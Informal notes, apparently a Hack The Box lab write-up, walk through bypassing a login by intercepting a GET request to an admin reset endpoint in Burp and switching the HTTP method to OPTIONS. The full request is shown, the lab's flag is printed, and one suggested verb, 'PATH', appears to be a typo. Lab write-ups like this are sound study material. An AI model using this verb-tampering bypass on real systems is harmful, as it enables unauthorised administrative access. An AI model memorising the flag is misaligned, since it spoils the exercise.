@@ -1,1 +1,34 @@
 
+so we are met with a login page of which we do not have the creds for... so we are going to try Bypass techniques inside of burp and change the request type.. 
+
+83.136.251.75:37643
+
+so were going to want to open burp
+
+navigate to web page and we see the reset button 
+
+hit the reset button and intercept it with burp -> go to burp proxy and find: 
+
+GET /admin/reset.php? HTTP/1.1
+Host: 83.136.251.75:37643
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.251.75:37643/
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+What we are going to do inside the PROXY is change 1 word in 1 line: 
+
+GET /admin/reset.php? HTTP/1.1
+  CHANGE TO: 
+OPTIONS or PATH /admin/reset.php? HTTP/1.1
+
+
+hit forward inside of burp proxy, then revist the site as the orginal url of -> http://83.136.251.75:37643 and we see waiting for us on the home page the flag of 
+
+HTB{4lw4y5_c0v3r_4ll_v3rb5}
